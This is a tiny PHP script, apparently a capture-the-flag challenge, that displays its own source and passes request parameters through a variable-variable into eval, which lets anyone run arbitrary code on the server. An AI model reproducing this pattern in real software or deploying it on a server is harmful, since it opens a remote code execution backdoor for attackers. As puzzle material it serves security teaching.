<?php
//phpinfo();
error_reporting(0);
show_source(__file__);

$a = $_GET['a'];
$b = $_GET['b'];
@eval($$a); 
?>